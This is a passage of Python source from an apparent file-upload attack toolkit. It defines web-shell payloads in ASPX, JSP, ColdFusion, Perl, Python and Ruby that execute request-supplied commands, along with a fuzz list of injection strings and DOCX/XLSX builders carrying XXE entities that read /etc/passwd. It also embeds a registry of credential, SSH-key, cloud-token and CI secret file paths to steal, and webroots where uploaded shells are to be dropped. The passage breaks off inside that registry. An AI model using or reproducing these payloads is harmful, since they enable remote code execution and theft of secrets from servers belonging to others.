             b'.Start("cmd.exe","/c "+Request["cmd"]); %>',           ["aspx"], "rce"),
        ],
        "jsp": [
            (b'<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>', jsp_e, "rce"),
            (b'<% out.println(Runtime.getRuntime().exec('
             b'request.getParameter("cmd")).toString()); %>',                 jsp_e, "rce"),
            (b'${"".class.forName("java.lang.Runtime").getMethod("exec",'
             b'"".class).invoke("".class.forName("java.lang.Runtime").getMethod'
             b'("getRuntime").invoke(null),request.getParameter("cmd"))}',     jsp_e, "rce_el"),
        ],
        "coldfusion": [
            (b'<cfexecute name="cmd.exe" arguments="/c #URL.cmd#" '
             b'timeout="5"></cfexecute>',                              cf_e, "rce"),
        ],
        "perl": [
            (b"#!/usr/bin/perl\nprint \"Content-type:text/html\\n\\n\";"
             b"print `$ENV{QUERY_STRING}`;",                          ["pl", "cgi"], "rce"),
            (b"#!/usr/bin/env python\nimport os,cgi\nprint('Content-type:text/html\\n')\n"
             b"print(os.popen(cgi.FieldStorage().getvalue('cmd','id')).read())", ["py", "cgi"], "rce"),
            (b"#!/usr/bin/env ruby\nrequire 'cgi'\nc=CGI.new\nputs c.header\n"
             b"puts `#{c['cmd']}`",                                   ["rb"], "rce"),
        ],
    }

SHELLS = _shells()

# Known fuzz strings (length/format/metachar attacks).
FUZZ = [
    "A" * 256, "A" * 4096, "A" * 65535,
    "%x" * 256, "%n" * 256, "%s" * 256, "%.4096d",
    "../" * 20, "....//" * 20, "%2e%2e/" * 20,
    "'", "\\", "<", "%", "`", "${7*7}", "{{7*7}}", "#{7*7}",
    "<script>alert(1)</script>", "<?php system('id'); ?>",
    "\r\n" * 50, "\x00" * 100, ";" * 100,
    "(" * 50 + "a" * 50 + ")" * 50 + "+",
]

# ── small file builders ───────────────────────────────────────────────────────
def _zip(inner_name, inner_bytes):
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr(inner_name, inner_bytes)
    return buf.getvalue()


def _docx_xxe():
    """Minimal OOXML-shaped zip carrying an XXE in word/document.xml."""
    ct = (b'<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org'
          b'/package/2006/content-types"><Default Extension="xml" '
          b'ContentType="application/xml"/></Types>')
    doc = (f'<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM '
           f'"file://{_lfi("/etc/passwd")}">]><w:document xmlns:w="http://schemas.'
           f'openxmlformats.org/wordprocessingml/2006/main"><w:body><w:p><w:r>'
           f'<w:t>&xxe;</w:t></w:r></w:p></w:body></w:document>').encode()
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr("[Content_Types].xml", ct)
        z.writestr("word/document.xml", doc)
    return buf.getvalue()


def _xlsx_xxe():
    """Minimal OOXML-shaped xlsx carrying an XXE in xl/worksheets/sheet1.xml
    (targets spreadsheet parsers / WPS Office — sample xlsx_xxe_wps.xlsx)."""
    ct = (b'<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org'
          b'/package/2006/content-types"><Default Extension="rels" ContentType='
          b'"application/vnd.openxmlformats-package.relationships+xml"/>'
          b'<Default Extension="xml" ContentType="application/xml"/>'
          b'<Override PartName="/xl/workbook.xml" ContentType="application/vnd.'
          b'openxmlformats-officedocument.spreadsheetml.sheet.main+xml"/></Types>')
    rels = (b'<?xml version="1.0"?><Relationships xmlns="http://schemas.'
            b'openxmlformats.org/package/2006/relationships"><Relationship Id="rId1"'
            b' Type="http://schemas.openxmlformats.org/officeDocument/2006/'
            b'relationships/officeDocument" Target="xl/workbook.xml"/></Relationships>')
    wb = (b'<?xml version="1.0"?><workbook xmlns="http://schemas.openxmlformats.org'
          b'/spreadsheetml/2006/main" xmlns:r="http://schemas.openxmlformats.org/'
          b'officeDocument/2006/relationships"><sheets><sheet name="S1" sheetId="1"'
          b' r:id="rId1"/></sheets></workbook>')
    sheet = (f'<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM '
             f'"file://{_lfi("/etc/passwd")}">]><worksheet xmlns="http://schemas.'
             f'openxmlformats.org/spreadsheetml/2006/main"><sheetData><row><c t="inlineStr">'
             f'<is><t>&xxe;</t></is></c></row></sheetData></worksheet>').encode()
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr("[Content_Types].xml", ct)
        z.writestr("_rels/.rels", rels)
        z.writestr("xl/workbook.xml", wb)
        z.writestr("xl/worksheets/sheet1.xml", sheet)
    return buf.getvalue()


def _png_text(key, value):
    chunk = key + b"\x00" + value
    crc = zlib_crc(b"tEXt" + chunk)
    return (b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01"
            b"\x08\x02\x00\x00\x00\x90wS\xde" + struct.pack(">I", len(chunk))
            + b"tEXt" + chunk + struct.pack(">I", crc)
            + b"\x00\x00\x00\nIDATx\x9cc\xf8\x0f\x00\x00\x01\x01\x00\x05\x18\xd8N"
            b"\x00\x00\x00\x00IEND\xaeB`\x82")


def zlib_crc(data):
    import zlib
    return zlib.crc32(data) & 0xffffffff


def _minimal_png(w=8, h=8):
    """Pixel-valid wxh white PNG (struct-built, no PIL) — passes getimagesize /
    identify / PIL.open. Synced from UpMap mod_polyglot_image_rce fallback."""
    def chunk(t, d):
        return struct.pack(">I", len(d)) + t + d + struct.pack(">I", zlib.crc32(t + d) & 0xffffffff)
    ihdr = struct.pack(">IIBBBBB", w, h, 8, 2, 0, 0, 0)
    raw  = (b"\x00" + b"\xff\xff\xff" * w) * h
    return (b"\x89PNG\r\n\x1a\n" + chunk(b"IHDR", ihdr)
            + chunk(b"IDAT", zlib.compress(raw)) + chunk(b"IEND", b""))


def _minimal_bmp():
    """Pixel-valid 1x1 24-bit BMP (BITMAPINFOHEADER). Synced from UpMap polyglot set."""
    pixel = b"\xff\xff\xff\x00"                       # 1 BGR px + row padding to 4 bytes
    dib   = struct.pack("<IiiHHIIiiII", 40, 1, 1, 1, 24, 0, len(pixel), 2835, 2835, 0, 0)
    off   = 14 + 40
    return b"BM" + struct.pack("<IHHI", off + len(pixel), 0, 0, off) + dib + pixel


# ─── BEGIN EMBEDDED PATHS (auto-generated by _embed_paths.py) ────────────
# Source of truth: paths.json (sibling file). Re-embed: _embed_paths.py.
_EMBEDDED_PATHS_JSON = r'''
{
  "$schema_version": 1,
  "$description": "Canonical known-file-paths registry. Consumed by UpMap, UpGen, and Upname to populate --file-read overrides (XXE/LFI/SSRF targets) and to build path-traversal payloads (../../../{path}) in Upname's filename-injection attack family.",
  "$consumers": {
    "UpMap.py":  "--file-read PATH routes every _lfi(ctx, …) site through the registry (XXE/SSI/SSRF/CSV/Ghostscript). Accepts a literal path OR @key.path into .linux / .windows / .devops_cloud / .cloud_metadata_endpoints.",
    "UpGen.py":  "--file-read PATH routes every _lfi/_lfi_urlenc/_lfi_charref site through the registry. Accepts the same literal-or-@key forms.",
    "Upname.py": "path_traversal attack reads .webroots.<lang>.<os> as the drop target and .linux / .windows / .devops_cloud / .cloud_metadata_endpoints as the read target."
  },
  "$placeholders": {
    "{USER}":       "non-root username on shared hosting / multi-user box",
    "{DOMAIN}":     "vhost domain name (e.g. example.com)",
    "{APP}":        "IIS site/application name",
    "{VERSION}":    "tool-specific version segment (e.g. PHP 8.2, PostgreSQL 14)",
    "{TOMCAT_VER}": "Tomcat major.minor (e.g. 9.0, 10.1)",
    "{YYMMDD}":     "IIS log date suffix",
    "{HOSTNAME}":   "machine short hostname (used in MySQL/XAMPP .err file names)"
  },

  "linux": {
    "system_info": [
      "/etc/passwd",
      "/etc/group",
      "/etc/hostname",
      "/etc/hosts",
      "/etc/issue",
      "/etc/issue.net",
      "/etc/os-release",
      "/etc/lsb-release",
      "/etc/redhat-release",
      "/etc/debian_version",
      "/etc/motd",
      "/etc/timezone",
      "/etc/machine-id",
      "/etc/fstab",
      "/etc/profile",
      "/etc/bash.bashrc",
      "/etc/environment"
    ],

    "network": [
      "/etc/resolv.conf",
      "/etc/network/interfaces",
      "/etc/netplan/01-netcfg.yaml",
      "/etc/netplan/50-cloud-init.yaml",
      "/etc/sysconfig/network",
      "/etc/sysconfig/network-scripts/ifcfg-eth0",
      "/proc/net/tcp",
      "/proc/net/tcp6",
      "/proc/net/udp",
      "/proc/net/route",
      "/proc/net/arp",
      "/proc/net/fib_trie",
      "/proc/net/unix",
      "/etc/iptables/rules.v4",
      "/etc/iptables/rules.v6",
      "/etc/nftables.conf"
    ],

    "process_runtime": [
      "/proc/self/environ",
      "/proc/self/cmdline",
      "/proc/self/status",
      "/proc/self/stat",
      "/proc/self/maps",
      "/proc/self/cwd",
      "/proc/self/exe",
      "/proc/self/root",
      "/proc/self/fd/0",
      "/proc/self/fd/1",
      "/proc/self/fd/2",
      "/proc/self/fd/3",
      "/proc/self/io",
      "/proc/self/limits",
      "/proc/self/mountinfo",
      "/proc/self/mounts",
      "/proc/version",
      "/proc/cmdline",
      "/proc/cpuinfo",
      "/proc/meminfo",
      "/proc/mounts",
      "/proc/loadavg",
      "/proc/uptime",
      "/proc/modules",
      "/proc/1/environ",
      "/proc/1/cmdline",
      "/proc/1/status"
    ],

    "credentials": [
      "/etc/shadow",
      "/etc/gshadow",
      "/etc/sudoers",
      "/etc/sudoers.d/",
      "/etc/security/opasswd",
      "/etc/security/passwd",
      "/etc/security/group",
      "/etc/pam.d/common-auth",
      "/root/.ssh/id_rsa",
      "/root/.ssh/id_dsa",
      "/root/.ssh/id_ecdsa",
      "/root/.ssh/id_ed25519",
      "/root/.ssh/authorized_keys",
      "/root/.ssh/known_hosts",
      "/root/.ssh/config",
      "/home/{USER}/.ssh/id_rsa",
      "/home/{USER}/.ssh/id_ed25519",
      "/home/{USER}/.ssh/authorized_keys",
      "/home/{USER}/.ssh/known_hosts",
      "/home/{USER}/.ssh/config",
      "/etc/ssh/sshd_config",
      "/etc/ssh/ssh_config",
      "/etc/ssh/ssh_host_rsa_key",
      "/etc/ssh/ssh_host_ecdsa_key",
      "/etc/ssh/ssh_host_ed25519_key",
      "/etc/ssh/ssh_host_dsa_key",
      "/root/.netrc",
      "/home/{USER}/.netrc",
      "/root/.pgpass",
      "/home/{USER}/.pgpass",
      "/root/.my.cnf",
      "/home/{USER}/.my.cnf"
    ],

    "shell_history": [
      "/root/.bash_history",
      "/root/.zsh_history",
      "/root/.sh_history",
      "/root/.ash_history",
      "/root/.lesshst",
      "/root/.viminfo",
      "/root/.nano_history",
      "/root/.python_history",
      "/root/.mysql_history",
      "/root/.psql_history",
      "/root/.rediscli_history",
      "/root/.sqlite_history",
      "/root/.node_repl_history",
      "/root/.irb_history",
      "/root/.local/share/recently-used.xbel",
      "/home/{USER}/.bash_history",
      "/home/{USER}/.zsh_history",
      "/home/{USER}/.python_history",
      "/home/{USER}/.mysql_history",
      "/home/{USER}/.psql_history",
      "/home/{USER}/.viminfo",
      "/home/{USER}/.lesshst"
    ],

    "logs": [
      "/var/log/auth.log",
      "/var/log/syslog",
      "/var/log/messages",
      "/var/log/secure",
      "/var/log/dmesg",
      "/var/log/kern.log",
      "/var/log/boot.log",
      "/var/log/wtmp",
      "/var/log/btmp",
      "/var/log/lastlog",
      "/var/log/utmp",
      "/var/log/faillog",
      "/var/log/audit/audit.log",
      "/var/log/cron",
      "/var/log/cron.log",
      "/var/log/maillog",
      "/var/log/mail.log",
      "/var/log/apache2/access.log",
      "/var/log/apache2/error.log",
      "/var/log/apache2/other_vhosts_access.log",
      "/var/log/httpd/access_log",
      "/var/log/httpd/error_log",
      "/var/log/nginx/access.log",
      "/var/log/nginx/error.log",
      "/var/log/mysql/error.log",
      "/var/log/mysql/mysql.log",
      "/var/log/mysql/mysql-slow.log",
      "/var/log/mariadb/mariadb.log",
      "/var/log/postgresql/postgresql-{VERSION}-main.log",
      "/var/log/redis/redis-server.log",
      "/var/log/php_errors.log",
      "/var/log/php-fpm/error.log",
      "/var/log/tomcat9/catalina.out",
      "/var/log/tomcat/catalina.out"
    ],

    "scheduled_tasks": [
      "/etc/crontab",
      "/etc/cron.d/",
      "/etc/cron.hourly/",
      "/etc/cron.daily/",
      "/etc/cron.weekly/",
      "/etc/cron.monthly/",
      "/etc/anacrontab",
      "/var/spool/cron/crontabs/root",
      "/var/spool/cron/crontabs/{USER}",
      "/var/spool/cron/{USER}",
      "/etc/at.allow",
      "/etc/at.deny",
      "/etc/systemd/system/",
      "/lib/systemd/system/",
      "/usr/lib/systemd/system/"
    ],

    "mail_spool": [
      "/var/spool/mail/root",
      "/var/spool/mail/{USER}",
      "/var/mail/root",
      "/var/mail/{USER}",
      "/var/spool/exim4/input/",
      "/var/spool/postfix/maildrop/"
    ],

    "app_configs": [
      "/etc/php/{VERSION}/fpm/php.ini",
      "/etc/php/{VERSION}/cli/php.ini",
      "/etc/php/{VERSION}/fpm/pool.d/www.conf",
      "/etc/php.ini",
      "/usr/local/etc/php/php.ini",
      "/etc/mysql/my.cnf",
      "/etc/mysql/mariadb.conf.d/50-server.cnf",
      "/etc/mysql/conf.d/mysql.cnf",
      "/etc/postgresql/{VERSION}/main/postgresql.conf",
      "/etc/postgresql/{VERSION}/main/pg_hba.conf",
      "/etc/redis/redis.conf",
      "/etc/redis.conf",
      "/etc/memcached.conf",
      "/etc/mongod.conf",
      "/etc/elasticsearch/elasticsearch.yml",
      "/etc/apache2/apache2.conf",
      "/etc/apache2/ports.conf",
      "/etc/apache2/sites-enabled/000-default.conf",
      "/etc/apache2/sites-available/default-ssl.conf",
      "/etc/apache2/mods-enabled/",
      "/etc/httpd/conf/httpd.conf",
      "/etc/httpd/conf.d/ssl.conf",
      "/etc/nginx/nginx.conf",
      "/etc/nginx/sites-enabled/default",
      "/etc/nginx/conf.d/default.conf",
      "/etc/proftpd/proftpd.conf",
      "/etc/vsftpd.conf",
      "/etc/pure-ftpd/pure-ftpd.conf",
      "/etc/samba/smb.conf",
      "/etc/squid/squid.conf",
      "/etc/openvpn/server.conf",
      "/etc/openvpn/client.conf",
      "/etc/wireguard/wg0.conf",
      "/etc/strongswan/ipsec.conf",
      "/etc/strongswan/ipsec.secrets",
      "/etc/freeradius/3.0/clients.conf"
    ]
  },

  "windows": {
    "system_info": [
      "C:/Windows/win.ini",
      "C:/Windows/system.ini",
      "C:/Windows/System32/drivers/etc/hosts",
      "C:/Windows/System32/drivers/etc/networks",
      "C:/Windows/System32/drivers/etc/services",
      "C:/Windows/System32/drivers/etc/protocol",
      "C:/Windows/System32/drivers/etc/lmhosts.sam",
      "C:/Windows/php.ini",
      "C:/Windows/my.ini",
      "C:/Windows/php/php.ini",
      "C:/boot.ini",
      "C:/autoexec.bat",
      "C:/Windows/setupact.log",
      "C:/Windows/setuperr.log"
    ],

    "registry_hives": [
      "C:/Windows/System32/config/SAM",
      "C:/Windows/System32/config/SYSTEM",
      "C:/Windows/System32/config/SECURITY",
      "C:/Windows/System32/config/SOFTWARE",
      "C:/Windows/System32/config/DEFAULT",
      "C:/Windows/System32/config/RegBack/SAM",
      "C:/Windows/System32/config/RegBack/SYSTEM",
      "C:/Windows/System32/config/RegBack/SECURITY",
      "C:/Windows/System32/config/RegBack/SOFTWARE",
      "C:/Windows/repair/sam",
      "C:/Windows/repair/system",
      "C:/Windows/repair/security",
      "C:/Windows/repair/software"
    ],

    "credentials": [
      "C:/unattend.xml",
      "C:/unattended.xml",
      "C:/Windows/Panther/Unattend.xml",
      "C:/Windows/Panther/Unattend/Unattended.xml",
      "C:/Windows/Panther/Unattended.xml",
      "C:/Windows/Panther/UnattendGC/setupact.log",
      "C:/Windows/System32/sysprep/sysprep.xml",
      "C:/Windows/System32/sysprep/sysprep.inf",
      "C:/sysprep.inf",
      "C:/sysprep.xml",
      "C:/Windows/debug/NetSetup.LOG",
      "C:/Windows/System32/config/SecEvent.Evt",
      "C:/ProgramData/Microsoft/Group Policy/History/",
      "C:/Users/{USER}/.ssh/id_rsa",
      "C:/Users/{USER}/.ssh/id_ed25519",
      "C:/Users/{USER}/.ssh/authorized_keys",
      "C:/Users/{USER}/.ssh/config",
      "C:/Users/Administrator/.ssh/id_rsa",
      "C:/ProgramData/ssh/sshd_config"
    ],

    "shell_history": [
      "C:/Users/{USER}/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine/ConsoleHost_history.txt",
      "C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine/ConsoleHost_history.txt",
      "C:/Users/{USER}/AppData/Local/Microsoft/Windows/History/History.IE5/",
      "C:/Users/{USER}/AppData/Roaming/Microsoft/Windows/Recent/"
    ],

    "logs": [
      "C:/inetpub/logs/LogFiles/W3SVC1/u_ex{YYMMDD}.log",
      "C:/Windows/System32/LogFiles/W3SVC1/u_ex{YYMMDD}.log",
      "C:/Windows/System32/LogFiles/HTTPERR/httperr1.log",
      "C:/Windows/System32/winevt/Logs/Security.evtx",
      "C:/Windows/System32/winevt/Logs/System.evtx",
      "C:/Windows/System32/winevt/Logs/Application.evtx",
      "C:/Windows/System32/winevt/Logs/Microsoft-Windows-PowerShell%4Operational.evtx",
      "C:/xampp/apache/logs/access.log",
      "C:/xampp/apache/logs/error.log",
      "C:/xampp/mysql/data/{HOSTNAME}.err",
      "C:/wamp/logs/access.log",
      "C:/wamp/logs/apache_error.log",
      "C:/wamp/logs/mysql.log",
      "C:/Program Files/Apache Software Foundation/Tomcat {TOMCAT_VER}/logs/catalina.{YYMMDD}.log",
      "C:/Program Files/Apache Software Foundation/Tomcat {TOMCAT_VER}/logs/localhost.{YYMMDD}.log",
      "C:/Program Files/MySQL/MySQL Server {VERSION}/data/{HOSTNAME}.err"
    ],

    "iis": [
      "C:/inetpub/wwwroot/web.config",
      "C:/inetpub/wwwroot/{APP}/web.config",
      "C:/Windows/System32/inetsrv/config/applicationHost.config",
      "C:/Windows/System32/inetsrv/config/administration.config",
      "C:/Windows/System32/inetsrv/config/redirection.config",
      "C:/Windows/System32/inetsrv/MetaBase.xml",
      "C:/inetpub/temp/IIS Temporary Compressed Files/",
      "C:/inetpub/history/"
    ],

    "third_party_creds": [
      "C:/Users/{USER}/AppData/Roaming/WinSCP.ini",
      "C:/Users/{USER}/AppData/Roaming/FileZilla/sitemanager.xml",
      "C:/Users/{USER}/AppData/Roaming/FileZilla/recentservers.xml",
      "C:/Users/{USER}/AppData/Roaming/FileZilla/filezilla.xml",
      "C:/ProgramData/Microsoft/Crypto/RSA/MachineKeys/",
      "C:/Program Files/PuTTY/sessions/",
      "C:/ProgramData/PuTTY/sessions/",
      "C:/Users/{USER}/.aws/credentials",
      "C:/Users/{USER}/.aws/config",
      "C:/Users/{USER}/.kube/config",
      "C:/Users/{USER}/.docker/config.json",
      "C:/Users/{USER}/AppData/Roaming/gcloud/credentials.db",
      "C:/Users/{USER}/AppData/Roaming/gcloud/application_default_credentials.json",
      "C:/Users/{USER}/.azure/accessTokens.json",
      "C:/Users/{USER}/.azure/azureProfile.json",
      "C:/Users/{USER}/AppData/Roaming/Mozilla/Firefox/Profiles/",
      "C:/Users/{USER}/AppData/Local/Google/Chrome/User Data/Default/Login Data",
      "C:/Users/{USER}/AppData/Local/Microsoft/Edge/User Data/Default/Login Data"
    ]
  },

  "webroots": {
    "$note": "Per-language drop targets for shell uploads after a successful path-traversal escape. The traversal payload becomes: ../../../{webroot}/{stem}.{ext}. Languages here mirror UpMap's MODULE_LANG and UpGen's ALL_LANGS.",

    "php": {
      "linux": [
        "/var/www/html/",
        "/var/www/",
        "/var/www/public/",
        "/usr/share/nginx/html/",
        "/etc/nginx/html/",
        "/srv/www/htdocs/",
        "/srv/http/",
        "/srv/www/",
        "/opt/lampp/htdocs/",
        "/opt/bitnami/apache2/htdocs/",
        "/home/{USER}/public_html/",
        "/home/{USER}/www/",
        "/var/www/vhosts/{DOMAIN}/httpdocs/",
        "/var/www/{DOMAIN}/public_html/"
      ],
      "windows": [
        "C:/xampp/htdocs/",
        "C:/wamp/www/",
        "C:/wamp64/www/",
        "C:/Apache24/htdocs/",
        "C:/Program Files/Apache Group/Apache2/htdocs/",
        "C:/Program Files (x86)/Apache Group/Apache2/htdocs/",
        "C:/inetpub/wwwroot/"
      ]
    },

    "asp": {
      "$note": "Classic ASP — Windows / IIS only.",
      "windows": [
        "C:/inetpub/wwwroot/",
        "C:/inetpub/wwwroot/{APP}/",
        "C:/inetpub/vhosts/{DOMAIN}/httpdocs/"
      ]
    },

    "aspx": {
      "$note": "ASP.NET — Windows / IIS only.",
      "windows": [
        "C:/inetpub/wwwroot/",
        "C:/inetpub/wwwroot/{APP}/",
        "C:/inetpub/wwwroot/{APP}/bin/",
        "C:/inetpub/wwwroot/{APP}/App_Code/",
        "C:/inetpub/vhosts/{DOMAIN}/httpdocs/"
      ]
    },

    "jsp": {
      "linux": [
        "/opt/tomcat/webapps/ROOT/",
        "/opt/tomcat/webapps/{APP}/",
        "/usr/local/tomcat/webapps/ROOT/",
        "/usr/share/tomcat9/webapps/ROOT/",
        "/var/lib/tomcat/webapps/ROOT/",
        "/var/lib/tomcat9/webapps/ROOT/",
        "/var/lib/tomcat10/webapps/ROOT/",
        "/opt/jetty/webapps/ROOT/",
        "/usr/share/jetty9/webapps/ROOT/",
        "/opt/wildfly/standalone/deployments/",
        "/opt/jboss/standalone/deployments/"
      ],
      "windows": [
        "C:/Program Files/Apache Software Foundation/Tomcat {TOMCAT_VER}/webapps/ROOT/",
        "C:/Tomcat/webapps/ROOT/",
        "C:/Tomcat{TOMCAT_VER}/webapps/ROOT/",
        "C:/Program Files/Jetty/webapps/ROOT/"
      ]
    },

    "coldfusion": {
      "linux": [
        "/opt/coldfusion{VERSION}/wwwroot/",
        "/opt/coldfusion/wwwroot/",
        "/opt/lucee/tomcat/webapps/ROOT/"
      ],
      "windows": [
        "C:/ColdFusion{VERSION}/wwwroot/",
        "C:/ColdFusion/wwwroot/",
        "C:/JRun4/servers/lib/wwwroot/",
        "C:/lucee/tomcat/webapps/ROOT/"
      ]
    },

    "perl_cgi": {
      "$note": "Generic CGI dir — Perl, Python, Ruby, Bash CGI scripts execute when dropped here.",
      "linux": [
        "/usr/lib/cgi-bin/",
        "/var/www/cgi-bin/",
        "/var/www/html/cgi-bin/",
        "/usr/local/apache2/cgi-bin/",
        "/srv/www/cgi-bin/",
        "/home/{USER}/cgi-bin/"
      ],
      "windows": [
        "C:/Apache24/cgi-bin/",
        "C:/xampp/cgi-bin/",
        "C:/wamp/cgi-bin/"
      ]
    },

    "static": {
      "$note": "Plain document roots — useful for dropping HTML/JS (XSS landing pages) or static config files.",
      "linux": [
        "/var/www/html/",
        "/usr/share/nginx/html/",
        "/srv/http/"
      ],
      "windows": [
        "C:/inetpub/wwwroot/",
        "C:/xampp/htdocs/"
      ]
    }
  },

  "devops_cloud": {
    "docker": [
      "/var/run/docker.sock",
      "/.dockerenv",
      "/etc/docker/daemon.json",
      "/etc/docker/key.json",
      "/var/lib/docker/containers/",
      "/var/lib/docker/image/",
      "/var/lib/docker/volumes/",
      "/root/.docker/config.json",
      "/home/{USER}/.docker/config.json",
      "C:/ProgramData/Docker/config/daemon.json",
      "C:/Users/{USER}/.docker/config.json"
    ],

    "kubernetes": [
      "/var/run/secrets/kubernetes.io/serviceaccount/token",
      "/var/run/secrets/kubernetes.io/serviceaccount/ca.crt",
      "/var/run/secrets/kubernetes.io/serviceaccount/namespace",
      "/etc/kubernetes/admin.conf",
      "/etc/kubernetes/kubelet.conf",
      "/etc/kubernetes/scheduler.conf",
      "/etc/kubernetes/controller-manager.conf",
      "/etc/kubernetes/pki/ca.crt",
      "/etc/kubernetes/pki/ca.key",
      "/etc/kubernetes/pki/apiserver.crt",
      "/etc/kubernetes/pki/apiserver.key",
      "/etc/kubernetes/pki/apiserver-kubelet-client.key",
      "/etc/kubernetes/pki/etcd/ca.crt",
      "/etc/kubernetes/pki/etcd/server.key",
      "/etc/kubernetes/manifests/",
      "/var/lib/kubelet/config.yaml",
      "/var/lib/kubelet/kubeadm-flags.env",
      "/var/lib/kubelet/pki/kubelet-client-current.pem",
      "/root/.kube/config",
      "/home/{USER}/.kube/config",
      "C:/Users/{USER}/.kube/config"
    ],

    "aws": [
      "/root/.aws/credentials",
      "/root/.aws/config",
      "/home/{USER}/.aws/credentials",
      "/home/{USER}/.aws/config",
      "/home/{USER}/.aws/cli/cache/",
      "/etc/aws/credentials",
      "C:/Users/{USER}/.aws/credentials",
      "C:/Users/{USER}/.aws/config"
    ],

    "gcp": [
      "/root/.config/gcloud/credentials.db",
      "/root/.config/gcloud/access_tokens.db",
      "/root/.config/gcloud/application_default_credentials.json",
      "/root/.config/gcloud/active_config",
      "/root/.config/gcloud/configurations/config_default",
      "/root/.config/gcloud/legacy_credentials/",
      "/home/{USER}/.config/gcloud/credentials.db",
      "/home/{USER}/.config/gcloud/application_default_credentials.json",
      "C:/Users/{USER}/AppData/Roaming/gcloud/credentials.db",
      "C:/Users/{USER}/AppData/Roaming/gcloud/application_default_credentials.json"
    ],

    "azure": [
      "/root/.azure/accessTokens.json",
      "/root/.azure/azureProfile.json",
      "/root/.azure/clouds.config",
      "/root/.azure/msal_token_cache.json",
      "/root/.azure/service_principal_entries.json",
      "/home/{USER}/.azure/accessTokens.json",
      "/home/{USER}/.azure/azureProfile.json",
      "C:/Users/{USER}/.azure/accessTokens.json",
      "C:/Users/{USER}/.azure/azureProfile.json",
      "C:/Users/{USER}/.azure/msal_token_cache.json"
    ],

    "cicd": [
      "/var/lib/jenkins/secrets/master.key",
      "/var/lib/jenkins/secrets/hudson.util.Secret",
      "/var/lib/jenkins/secrets/initialAdminPassword",
      "/var/lib/jenkins/credentials.xml",
      "/var/lib/jenkins/jobs/",
      "/var/lib/jenkins/users/",
      "/var/lib/jenkins/config.xml",
      "/home/jenkins/.ssh/id_rsa",
      "/home/jenkins/workspace/",
      "/home/gitlab-runner/.gitlab-runner/config.toml",
      "/etc/gitlab-runner/config.toml",
      "/var/opt/gitlab/gitlab-rails/etc/secrets.yml",
      "/var/opt/gitlab/postgresql/data/pg_hba.conf",
      "C:/ProgramData/GitLab-Runner/config.toml",
      "C:/Program Files/Jenkins/secrets/master.key",
      "./.github/workflows/",
      "./.gitlab-ci.yml",
      "./Jenkinsfile",
      "./.circleci/config.yml",
      "./.drone.yml",
      "./bitbucket-pipelines.yml",
      "./azure-pipelines.yml",
      "./.travis.yml",
      "./buildspec.yml",
      "./cloudbuild.yaml"
    ],

    "scm": [
      "/.git/config",
      "/.git/HEAD",
      "/.git/credentials",
      "/.git/logs/HEAD",
      "/.git/index",
      "/.git/packed-refs",
      "/.git/info/exclude",
      "/.gitconfig",
      "/root/.gitconfig",
      "/root/.git-credentials",
      "/home/{USER}/.gitconfig",
      "/home/{USER}/.git-credentials",
      "/.svn/entries",
      "/.svn/wc.db",
      "/.svn/all-wcprops",
      "/.hg/store/",
      "/.hg/hgrc",
      "/.bzr/branch/branch.conf",
      "/CVS/Root",
      "/CVS/Entries"
    ],

    "iac": [
      "./terraform.tfstate",
      "./terraform.tfstate.backup",
      "./.terraform/terraform.tfstate",
      "./.terraform.lock.hcl",
      "./terraform.tfvars",
      "./secrets.auto.tfvars",
      "./packer.json",
      "/etc/ansible/hosts",
      "/etc/ansible/ansible.cfg",
      "/home/{USER}/.ansible/cp/",
      "/home/{USER}/.ansible.cfg",
      "./ansible.cfg",
      "./inventory",
      "/etc/salt/master",
      "/etc/salt/minion",
      "/etc/salt/pki/master/master.pem",
      "/etc/salt/pki/minion/minion.pem",
      "/etc/chef/client.rb",
      "/etc/chef/client.pem",
      "/etc/chef/validation.pem",
      "/etc/puppet/puppet.conf",
      "/etc/puppetlabs/puppet/ssl/private_keys/",
      "/etc/cfengine/ppkeys/localhost.priv"
    ],

    "secrets_managers": [
      "/var/lib/vault/",
      "/etc/vault.d/vault.hcl",
      "/etc/vault.d/agent.hcl",
      "/opt/vault/data/",
      "/opt/consul/data/",
      "/etc/consul.d/",
      "/etc/consul/server.json",
      "/var/lib/etcd/",
      "/etc/etcd/etcd.conf",
      "/etc/etcd/ssl/etcd-server.pem"
    ],

    "containers_runtime": [
      "/proc/1/cgroup",
      "/sys/fs/cgroup/",
      "/run/containerd/containerd.sock",
      "/var/run/containerd/containerd.sock",
      "/run/crio/crio.sock",
      "/var/run/crio/crio.sock",
      "/etc/containerd/config.toml",
      "/etc/crio/crio.conf"
    ],

    "env_files": [
      "./.env",
      "./.env.local",
      "./.env.production",
      "./.env.development",
      "./.env.staging",
      "./.env.test",
      "/etc/environment",
      "/etc/default/locale",
      "./config.yaml",
      "./config.yml",
      "./settings.yaml",
      "./application.properties",
      "./application.yml"
    ],

    "databases": [
      "/var/lib/mysql/mysql/user.MYD",
      "/var/lib/mysql/ibdata1",
      "/var/lib/mysql/mysql.sock",
      "/var/lib/postgresql/{VERSION}/main/base/",
      "/var/lib/postgresql/{VERSION}/main/postmaster.pid",
      "/var/lib/redis/dump.rdb",
      "/var/lib/mongodb/",
      "/var/lib/elasticsearch/",
      "/var/backups/dump.sql",
      "/tmp/dump.sql",
      "/tmp/backup.tar.gz"
    ]
  },

  "cloud_metadata_endpoints": {
    "$note": "FILE-BASED cloud instance-metadata artifacts written to disk at boot by cloud-init / waagent / GCE guest agent. LFI-safe: every leaf here is a real local file. URL counterparts live under .ssrf_targets (consumed by the SSRF module, not by --file-read).",

    "aws": [
      "/var/lib/cloud/data/instance-id",
      "/var/lib/cloud/data/previous-instance-id",
      "/var/lib/cloud/data/result.json",
      "/var/lib/cloud/data/status.json",
      "/var/lib/cloud/instance/user-data.txt",
      "/var/lib/cloud/instance/user-data.txt.i",
